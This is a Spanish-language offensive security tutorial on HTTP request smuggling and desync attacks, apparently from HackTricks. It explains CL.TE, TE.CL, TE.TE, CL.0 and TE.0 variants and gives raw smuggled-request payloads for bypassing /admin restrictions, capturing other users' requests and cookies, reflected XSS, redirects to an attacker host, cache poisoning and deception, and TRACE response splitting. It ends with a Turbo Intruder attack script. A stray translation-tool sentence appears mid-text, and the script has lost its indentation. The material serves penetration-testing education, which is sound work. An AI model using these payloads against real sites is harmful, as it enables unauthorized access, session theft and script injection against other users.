# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}

## Qué es

Esta vulnerabilidad ocurre cuando una **desincronización** entre los **proxies de front-end** y el **servidor de back-end** permite a un **atacante** **enviar** una **solicitud** HTTP que será **interpretada** como una **solicitud única** por los **proxies de front-end** (balanceador de carga/proxy inverso) y **como 2 solicitudes** por el **servidor de back-end**.\
Esto permite a un usuario **modificar la siguiente solicitud que llega al servidor de back-end después de la suya**.

### Teoría

[**Especificación RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si se recibe un mensaje con un campo de encabezado Transfer-Encoding y un campo de encabezado Content-Length, este último DEBE ser ignorado.

**Content-Length**

> El encabezado de entidad Content-Length indica el tamaño del cuerpo de la entidad, en bytes, enviado al destinatario.

**Transfer-Encoding: chunked**

> El encabezado Transfer-Encoding especifica la forma de codificación utilizada para transferir de manera segura el cuerpo de la carga útil al usuario.\
> Chunked significa que los datos grandes se envían en una serie de fragmentos.

### Realidad

El **Front-End** (un balanceador de carga / Proxy Inverso) **procesa** el encabezado _**content-length**_ o el _**transfer-encoding**_ y el **servidor de Back-end** **procesa el otro** provocando una **desincronización** entre los 2 sistemas.\
Esto podría ser muy crítico ya que **un atacante podrá enviar una solicitud** al proxy inverso que será **interpretada** por el **servidor de back-end** **como 2 solicitudes diferentes**. El **peligro** de esta técnica reside en el hecho de que el **servidor de back-end** **interpretará** la **2ª solicitud inyectada** como si **viniera del siguiente cliente** y la **solicitud real** de ese cliente será **parte** de la **solicitud inyectada**.

### Particularidades

Recuerda que en HTTP **un carácter de nueva línea está compuesto por 2 bytes:**

- **Content-Length**: Este encabezado utiliza un **número decimal** para indicar el **número** de **bytes** del **cuerpo** de la solicitud. Se espera que el cuerpo termine en el último carácter, **no se necesita una nueva línea al final de la solicitud**.
- **Transfer-Encoding:** Este encabezado utiliza en el **cuerpo** un **número hexadecimal** para indicar el **número** de **bytes** del **siguiente fragmento**. El **fragmento** debe **terminar** con una **nueva línea** pero esta nueva línea **no se cuenta** por el indicador de longitud. Este método de transferencia debe terminar con un **fragmento de tamaño 0 seguido de 2 nuevas líneas**: `0`
- **Connection**: Basado en mi experiencia, se recomienda usar **`Connection: keep-alive`** en la primera solicitud del HTTP Request Smuggling.

## Ejemplos Básicos

> [!TIP]
> Al intentar explotar esto con Burp Suite **desactiva `Update Content-Length` y `Normalize HTTP/1 line endings`** en el repetidor porque algunos gadgets abusan de nuevas líneas, retornos de carro y content-lengths malformados.

Los ataques de HTTP request smuggling se elaboran enviando solicitudes ambiguas que explotan discrepancias en cómo los servidores de front-end y back-end interpretan los encabezados `Content-Length` (CL) y `Transfer-Encoding` (TE). Estos ataques pueden manifestarse en diferentes formas, principalmente como **CL.TE**, **TE.CL**, y **TE.TE**. Cada tipo representa una combinación única de cómo los servidores de front-end y back-end priorizan estos encabezados. Las vulnerabilidades surgen de que los servidores procesan la misma solicitud de diferentes maneras, lo que lleva a resultados inesperados y potencialmente maliciosos.

### Ejemplos Básicos de Tipos de Vulnerabilidad

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!NOTE]
> A la tabla anterior deberías agregar la técnica TE.0, como la técnica CL.0 pero usando Transfer Encoding.

#### Vulnerabilidad CL.TE (Content-Length usado por Front-End, Transfer-Encoding usado por Back-End)

- **Front-End (CL):** Procesa la solicitud basada en el encabezado `Content-Length`.
- **Back-End (TE):** Procesa la solicitud basada en el encabezado `Transfer-Encoding`.
- **Escenario de Ataque:**

- El atacante envía una solicitud donde el valor del encabezado `Content-Length` no coincide con la longitud real del contenido.
- El servidor de front-end reenvía toda la solicitud al back-end, basado en el valor de `Content-Length`.
- El servidor de back-end procesa la solicitud como fragmentada debido al encabezado `Transfer-Encoding: chunked`, interpretando los datos restantes como una solicitud separada y subsiguiente.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vulnerabilidad TE.CL (Transfer-Encoding usado por Front-End, Content-Length usado por Back-End)

- **Front-End (TE):** Procesa la solicitud basada en el encabezado `Transfer-Encoding`.
- **Back-End (CL):** Procesa la solicitud basada en el encabezado `Content-Length`.
- **Escenario de Ataque:**

- El atacante envía una solicitud fragmentada donde el tamaño del fragmento (`7b`) y la longitud real del contenido (`Content-Length: 4`) no se alinean.
- El servidor de front-end, respetando `Transfer-Encoding`, reenvía toda la solicitud al back-end.
- El servidor de back-end, respetando `Content-Length`, procesa solo la parte inicial de la solicitud (`7b` bytes), dejando el resto como parte de una solicitud subsiguiente no intencionada.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vulnerabilidad TE.TE (Transfer-Encoding usado por ambos, con ofuscación)

- **Servidores:** Ambos soportan `Transfer-Encoding`, pero uno puede ser engañado para ignorarlo a través de ofuscación.
- **Escenario de Ataque:**

- El atacante envía una solicitud con encabezados `Transfer-Encoding` ofuscados.
- Dependiendo de qué servidor (front-end o back-end) no reconozca la ofuscación, se puede explotar una vulnerabilidad CL.TE o TE.CL.
- La parte no procesada de la solicitud, como la ve uno de los servidores, se convierte en parte de una solicitud subsiguiente, llevando a smuggling.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Escenario CL.CL (Content-Length usado por ambos Front-End y Back-End)**

- Ambos servidores procesan la solicitud basándose únicamente en el encabezado `Content-Length`.
- Este escenario típicamente no conduce a smuggling, ya que hay alineación en cómo ambos servidores interpretan la longitud de la solicitud.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Solicitud Normal
```

#### **Escenario CL.0**

- Se refiere a escenarios donde el encabezado `Content-Length` está presente y tiene un valor diferente de cero, indicando que el cuerpo de la solicitud tiene contenido. El back-end ignora el encabezado `Content-Length` (que se trata como 0), pero el front-end lo analiza.
- Es crucial para entender y elaborar ataques de smuggling, ya que influye en cómo los servidores determinan el final de una solicitud.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Cuerpo No Vacío
```

#### Escenario TE.0

- Similar al anterior pero usando TE.
- Técnica [reportada aquí](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Ejemplo**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### Rompiendo el servidor web

Esta técnica también es útil en escenarios donde es posible **romper un servidor web mientras se lee los datos HTTP iniciales** pero **sin cerrar la conexión**. De esta manera, el **cuerpo** de la solicitud HTTP será considerado la **siguiente solicitud HTTP**.

Por ejemplo, como se explica en [**este informe**](https://mizu.re/post/twisty-python), en Werkzeug era posible enviar algunos **caracteres Unicode** y esto haría que el servidor **se rompiera**. Sin embargo, si la conexión HTTP se creó con el encabezado **`Connection: keep-alive`**, el cuerpo de la solicitud no será leído y la conexión seguirá abierta, por lo que el **cuerpo** de la solicitud será tratado como la **siguiente solicitud HTTP**.

#### Forzando a través de encabezados hop-by-hop

Abusando de los encabezados hop-by-hop, podrías indicar al proxy que **elimine el encabezado Content-Length o Transfer-Encoding para que un HTTP request smuggling sea posible de abusar**.
```
Connection: Content-Length
```
Para **más información sobre los encabezados hop-by-hop** visita:

{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Encontrar HTTP Request Smuggling

Identificar vulnerabilidades de HTTP request smuggling a menudo se puede lograr utilizando técnicas de temporización, que se basan en observar cuánto tiempo tarda el servidor en responder a solicitudes manipuladas. Estas técnicas son particularmente útiles para detectar vulnerabilidades CL.TE y TE.CL. Además de estos métodos, hay otras estrategias y herramientas que se pueden utilizar para encontrar tales vulnerabilidades:

### Encontrar Vulnerabilidades CL.TE Usando Técnicas de Temporización

- **Método:**

- Envía una solicitud que, si la aplicación es vulnerable, hará que el servidor de back-end espere datos adicionales.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Observación:**
- El servidor frontal procesa la solicitud en función de `Content-Length` y corta el mensaje prematuramente.
- El servidor de back-end, esperando un mensaje en trozos, espera el siguiente trozo que nunca llega, causando un retraso.

- **Indicadores:**
- Timeouts o largos retrasos en la respuesta.
- Recibir un error 400 Bad Request del servidor de back-end, a veces con información detallada del servidor.

### Encontrar Vulnerabilidades TE.CL Usando Técnicas de Temporización

- **Método:**

- Envía una solicitud que, si la aplicación es vulnerable, hará que el servidor de back-end espere datos adicionales.
- **Ejemplo:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Observación:**
- El servidor frontal procesa la solicitud en función de `Transfer-Encoding` y reenvía todo el mensaje.
- El servidor de back-end, esperando un mensaje basado en `Content-Length`, espera datos adicionales que nunca llegan, causando un retraso.

### Otros Métodos para Encontrar Vulnerabilidades

- **Análisis de Respuesta Diferencial:**
- Envía versiones ligeramente variadas de una solicitud y observa si las respuestas del servidor difieren de manera inesperada, indicando una discrepancia en el análisis.
- **Uso de Herramientas Automatizadas:**
- Herramientas como la extensión 'HTTP Request Smuggler' de Burp Suite pueden probar automáticamente estas vulnerabilidades enviando varias formas de solicitudes ambiguas y analizando las respuestas.
- **Pruebas de Variación de Content-Length:**
- Envía solicitudes con valores de `Content-Length` variables que no están alineados con la longitud real del contenido y observa cómo maneja el servidor tales desajustes.
- **Pruebas de Variación de Transfer-Encoding:**
- Envía solicitudes con encabezados de `Transfer-Encoding` ofuscados o malformados y monitorea cómo responden de manera diferente los servidores frontal y de back-end a tales manipulaciones.

### Pruebas de Vulnerabilidad de HTTP Request Smuggling

Después de confirmar la efectividad de las técnicas de temporización, es crucial verificar si se pueden manipular las solicitudes del cliente. Un método sencillo es intentar envenenar tus solicitudes, por ejemplo, haciendo que una solicitud a `/` produzca una respuesta 404. Los ejemplos de `CL.TE` y `TE.CL` discutidos anteriormente en [Ejemplos Básicos](./#basic-examples) demuestran cómo envenenar la solicitud de un cliente para provocar una respuesta 404, a pesar de que el cliente intenta acceder a un recurso diferente.

**Consideraciones Clave**

Al probar vulnerabilidades de request smuggling interfiriendo con otras solicitudes, ten en cuenta:

- **Conexiones de Red Distintas:** Las solicitudes "de ataque" y "normales" deben enviarse a través de conexiones de red separadas. Utilizar la misma conexión para ambas no valida la presencia de la vulnerabilidad.
- **URL y Parámetros Consistentes:** Intenta usar URLs y nombres de parámetros idénticos para ambas solicitudes. Las aplicaciones modernas a menudo dirigen las solicitudes a servidores de back-end específicos según la URL y los parámetros. Coincidir estos aumenta la probabilidad de que ambas solicitudes sean procesadas por el mismo servidor, un requisito previo para un ataque exitoso.
- **Condiciones de Temporización y Carrera:** La solicitud "normal", destinada a detectar interferencias de la solicitud "de ataque", compite contra otras solicitudes concurrentes de la aplicación. Por lo tanto, envía la solicitud "normal" inmediatamente después de la solicitud "de ataque". Las aplicaciones ocupadas pueden requerir múltiples intentos para una confirmación concluyente de vulnerabilidad.
- **Desafíos de Balanceo de Carga:** Los servidores frontales que actúan como balanceadores de carga pueden distribuir solicitudes entre varios sistemas de back-end. Si las solicitudes "de ataque" y "normales" terminan en diferentes sistemas, el ataque no tendrá éxito. Este aspecto de balanceo de carga puede requerir varios intentos para confirmar una vulnerabilidad.
- **Impacto No Intencionado en el Usuario:** Si tu ataque impacta inadvertidamente la solicitud de otro usuario (no la solicitud "normal" que enviaste para la detección), esto indica que tu ataque influyó en otro usuario de la aplicación. Las pruebas continuas podrían interrumpir a otros usuarios, lo que requiere un enfoque cauteloso.

## Abusando de HTTP Request Smuggling

### Eludir la Seguridad del Front-End a través de HTTP Request Smuggling

A veces, los proxies frontales imponen medidas de seguridad, examinando las solicitudes entrantes. Sin embargo, estas medidas pueden ser eludidas al explotar HTTP Request Smuggling, permitiendo el acceso no autorizado a puntos finales restringidos. Por ejemplo, acceder a `/admin` podría estar prohibido externamente, con el proxy frontal bloqueando activamente tales intentos. Sin embargo, este proxy puede descuidar inspeccionar las solicitudes incrustadas dentro de una solicitud HTTP contrabandeada, dejando una brecha para eludir estas restricciones.

Considera los siguientes ejemplos que ilustran cómo HTTP Request Smuggling puede ser utilizado para eludir los controles de seguridad del front-end, específicamente apuntando a la ruta `/admin` que generalmente está protegida por el proxy frontal:

**Ejemplo CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
En el ataque CL.TE, se aprovecha el encabezado `Content-Length` para la solicitud inicial, mientras que la solicitud embebida subsiguiente utiliza el encabezado `Transfer-Encoding: chunked`. El proxy del front-end procesa la solicitud `POST` inicial pero no inspecciona la solicitud embebida `GET /admin`, lo que permite el acceso no autorizado a la ruta `/admin`.

**Ejemplo TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Por el contrario, en el ataque TE.CL, la solicitud inicial `POST` utiliza `Transfer-Encoding: chunked`, y la solicitud embebida subsiguiente se procesa en función del encabezado `Content-Length`. Similar al ataque CL.TE, el proxy de front-end pasa por alto la solicitud `GET /admin` contrabandeada, otorgando inadvertidamente acceso a la ruta restringida `/admin`.

### Revelando la reescritura de solicitudes de front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Las aplicaciones a menudo emplean un **servidor de front-end** para modificar las solicitudes entrantes antes de pasarlas al servidor de back-end. Una modificación típica implica agregar encabezados, como `X-Forwarded-For: <IP del cliente>`, para transmitir la IP del cliente al back-end. Comprender estas modificaciones puede ser crucial, ya que podría revelar formas de **eludir protecciones** o **descubrir información o puntos finales ocultos**.

Para investigar cómo un proxy altera una solicitud, localiza un parámetro POST que el back-end ecoa en la respuesta. Luego, elabora una solicitud, utilizando este parámetro al final, similar a lo siguiente:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
En esta estructura, los componentes de la solicitud subsiguiente se añaden después de `search=`, que es el parámetro reflejado en la respuesta. Este reflejo expondrá los encabezados de la solicitud subsiguiente.

Es importante alinear el encabezado `Content-Length` de la solicitud anidada con la longitud real del contenido. Se aconseja comenzar con un valor pequeño e incrementar gradualmente, ya que un valor demasiado bajo truncará los datos reflejados, mientras que un valor demasiado alto puede causar que la solicitud falle.

Esta técnica también es aplicable en el contexto de una vulnerabilidad TE.CL, pero la solicitud debe terminar con `search=\r\n0`. Independientemente de los caracteres de nueva línea, los valores se añadirán al parámetro de búsqueda.

Este método sirve principalmente para entender las modificaciones de la solicitud realizadas por el proxy del front-end, realizando esencialmente una investigación autodirigida.

### Capturando las solicitudes de otros usuarios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Es factible capturar las solicitudes del siguiente usuario añadiendo una solicitud específica como el valor de un parámetro durante una operación POST. Aquí se explica cómo se puede lograr:

Al añadir la siguiente solicitud como el valor de un parámetro, puedes almacenar la solicitud del cliente subsiguiente:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
En este escenario, el **parámetro de comentario** está destinado a almacenar el contenido dentro de la sección de comentarios de una publicación en una página accesible públicamente. En consecuencia, el contenido de la solicitud subsiguiente aparecerá como un comentario.

Sin embargo, esta técnica tiene limitaciones. Generalmente, captura datos solo hasta el delimitador de parámetro utilizado en la solicitud contrabandeada. Para envíos de formularios codificados en URL, este delimitador es el carácter `&`. Esto significa que el contenido capturado de la solicitud del usuario víctima se detendrá en el primer `&`, que incluso puede ser parte de la cadena de consulta.

Además, vale la pena señalar que este enfoque también es viable con una vulnerabilidad TE.CL. En tales casos, la solicitud debe concluir con `search=\r\n0`. Independientemente de los caracteres de nueva línea, los valores se agregarán al parámetro de búsqueda.

### Usando el contrabando de solicitudes HTTP para explotar XSS reflejado

El contrabando de solicitudes HTTP se puede aprovechar para explotar páginas web vulnerables a **XSS Reflejado**, ofreciendo ventajas significativas:

- La interacción con los usuarios objetivo **no es necesaria**.
- Permite la explotación de XSS en partes de la solicitud que son **normalmente inalcanzables**, como los encabezados de solicitudes HTTP.

En escenarios donde un sitio web es susceptible a XSS Reflejado a través del encabezado User-Agent, la siguiente carga útil demuestra cómo explotar esta vulnerabilidad:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Este payload está estructurado para explotar la vulnerabilidad mediante:

1. Iniciando una solicitud `POST`, aparentemente típica, con un encabezado `Transfer-Encoding: chunked` para indicar el inicio del smuggling.
2. Siguiendo con un `0`, marcando el final del cuerpo del mensaje en chunks.
3. Luego, se introduce una solicitud `GET` smuggled, donde el encabezado `User-Agent` se inyecta con un script, `<script>alert(1)</script>`, activando el XSS cuando el servidor procesa esta solicitud subsiguiente.

Al manipular el `User-Agent` a través del smuggling, el payload elude las restricciones normales de solicitud, explotando así la vulnerabilidad de XSS Reflejado de una manera no estándar pero efectiva.

#### HTTP/0.9

> [!CAUTION]
> En caso de que el contenido del usuario se refleje en una respuesta con un **`Content-type`** como **`text/plain`**, impidiendo la ejecución del XSS. Si el servidor soporta **HTTP/0.9, podría ser posible eludir esto**!

La versión HTTP/0.9 fue anterior a la 1.0 y solo utiliza verbos **GET** y **no** responde con **encabezados**, solo con el cuerpo.

En [**este writeup**](https://mizu.re/post/twisty-python), esto fue abusado con un smuggling de solicitudes y un **punto final vulnerable que responderá con la entrada del usuario** para smuggling una solicitud con HTTP/0.9. El parámetro que se reflejará en la respuesta contenía una **respuesta HTTP/1.1 falsa (con encabezados y cuerpo)**, por lo que la respuesta contendrá código JS ejecutable válido con un `Content-Type` de `text/html`.

### Explotando redirecciones en el sitio con HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Las aplicaciones a menudo redirigen de una URL a otra utilizando el nombre de host del encabezado `Host` en la URL de redirección. Esto es común en servidores web como Apache e IIS. Por ejemplo, solicitar una carpeta sin una barra final resulta en una redirección para incluir la barra:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Aunque aparentemente inofensivo, este comportamiento puede ser manipulado utilizando HTTP request smuggling para redirigir a los usuarios a un sitio externo. Por ejemplo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Esta solicitud encubierta podría hacer que la siguiente solicitud de usuario procesada sea redirigida a un sitio web controlado por un atacante:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Resultados en:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
En este escenario, la solicitud de un usuario para un archivo JavaScript es secuestrada. El atacante puede comprometer potencialmente al usuario al servir JavaScript malicioso en respuesta.

### Explotando la contaminación de caché web a través del HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

La contaminación de caché web puede ejecutarse si cualquier componente de la **infraestructura de front-end almacena contenido en caché**, típicamente para mejorar el rendimiento. Al manipular la respuesta del servidor, es posible **contaminar la caché**.

Anteriormente, observamos cómo se podían alterar las respuestas del servidor para devolver un error 404 (consulte [Ejemplos Básicos](./#basic-examples)). De manera similar, es factible engañar al servidor para que entregue contenido de `/index.html` en respuesta a una solicitud de `/static/include.js`. En consecuencia, el contenido de `/static/include.js` se reemplaza en la caché con el de `/index.html`, haciendo que `/static/include.js` sea inaccesible para los usuarios, lo que potencialmente puede llevar a una Denegación de Servicio (DoS).

Esta técnica se vuelve particularmente potente si se descubre una **vulnerabilidad de Redirección Abierta** o si hay una **redirección en el sitio a una redirección abierta**. Tales vulnerabilidades pueden ser explotadas para reemplazar el contenido en caché de `/static/include.js` con un script bajo el control del atacante, habilitando esencialmente un ataque de Cross-Site Scripting (XSS) generalizado contra todos los clientes que soliciten el `/static/include.js` actualizado.

A continuación se muestra una ilustración de la explotación de **contaminación de caché combinada con una redirección en el sitio a una redirección abierta**. El objetivo es alterar el contenido de la caché de `/static/include.js` para servir código JavaScript controlado por el atacante:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Nota la solicitud incrustada que apunta a `/post/next?postId=3`. Esta solicitud será redirigida a `/post?postId=4`, utilizando el **valor del encabezado Host** para determinar el dominio. Al alterar el **encabezado Host**, el atacante puede redirigir la solicitud a su dominio (**redirección en el sitio a redirección abierta**).

Después de un exitoso **envenenamiento de socket**, se debe iniciar una **solicitud GET** para `/static/include.js`. Esta solicitud será contaminada por la anterior solicitud de **redirección en el sitio a redirección abierta** y obtendrá el contenido del script controlado por el atacante.

Posteriormente, cualquier solicitud para `/static/include.js` servirá el contenido en caché del script del atacante, lanzando efectivamente un amplio ataque XSS.

### Usando el envenenamiento de solicitudes HTTP para realizar engaño de caché web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **¿Cuál es la diferencia entre el envenenamiento de caché web y el engaño de caché web?**
>
> - En el **envenenamiento de caché web**, el atacante provoca que la aplicación almacene contenido malicioso en la caché, y este contenido se sirve desde la caché a otros usuarios de la aplicación.
> - En el **engaño de caché web**, el atacante provoca que la aplicación almacene contenido sensible perteneciente a otro usuario en la caché, y luego el atacante recupera este contenido de la caché.

El atacante elabora una solicitud contrabandeada que obtiene contenido sensible específico del usuario. Considera el siguiente ejemplo:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si esta solicitud encubierta envenena una entrada de caché destinada a contenido estático (por ejemplo, `/someimage.png`), los datos sensibles de la víctima de `/private/messages` podrían ser almacenados en caché bajo la entrada de caché del contenido estático. En consecuencia, el atacante podría potencialmente recuperar estos datos sensibles almacenados en caché.

### Abusando de TRACE a través de HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**En esta publicación**](https://portswigger.net/research/trace-desync-attack) se sugiere que si el servidor tiene habilitado el método TRACE, podría ser posible abusar de él con un HTTP Request Smuggling. Esto se debe a que este método reflejará cualquier encabezado enviado al servidor como parte del cuerpo de la respuesta. Por ejemplo:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Por favor, envíame el contenido que deseas traducir.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Un ejemplo de cómo abusar de este comportamiento sería **introducir primero una solicitud HEAD**. Esta solicitud será respondida solo con los **encabezados** de una solicitud GET (**`Content-Type`** entre ellos). Y introducir **inmediatamente después de la HEAD una solicitud TRACE**, que reflejará los datos enviados.\
Como la respuesta HEAD contendrá un encabezado `Content-Length`, la **respuesta de la solicitud TRACE será tratada como el cuerpo de la respuesta HEAD, reflejando así datos arbitrarios** en la respuesta.\
Esta respuesta se enviará a la siguiente solicitud a través de la conexión, por lo que esto podría ser **utilizado en un archivo JS en caché, por ejemplo, para inyectar código JS arbitrario**.

### Abusando de TRACE a través de la división de respuestas HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continuar siguiendo [**esta publicación**](https://portswigger.net/research/trace-desync-attack) se sugiere como otra forma de abusar del método TRACE. Como se comentó, al introducir una solicitud HEAD y una solicitud TRACE es posible **controlar algunos datos reflejados** en la respuesta a la solicitud HEAD. La longitud del cuerpo de la solicitud HEAD está básicamente indicada en el encabezado Content-Length y se forma por la respuesta a la solicitud TRACE.

Por lo tanto, la nueva idea sería que, sabiendo este Content-Length y los datos dados en la respuesta TRACE, es posible hacer que la respuesta TRACE contenga una respuesta HTTP válida después del último byte del Content-Length, permitiendo a un atacante controlar completamente la solicitud a la siguiente respuesta (lo que podría ser utilizado para realizar un envenenamiento de caché).

Ejemplo:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Generará estas respuestas (note cómo la respuesta HEAD tiene un Content-Length que hace que la respuesta TRACE sea parte del cuerpo de HEAD y una vez que termina el Content-Length de HEAD, se infiltra una respuesta HTTP válida):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Arma de HTTP Request Smuggling con Desincronización de Respuestas HTTP

¿Has encontrado alguna vulnerabilidad de HTTP Request Smuggling y no sabes cómo explotarla? Prueba este otro método de explotación:

{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Otras Técnicas de HTTP Request Smuggling

- HTTP Request Smuggling en el Navegador (Lado del Cliente)

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling en Downgrades de HTTP/2

{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Scripts de Turbo Intruder

### CL.TE

Desde [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

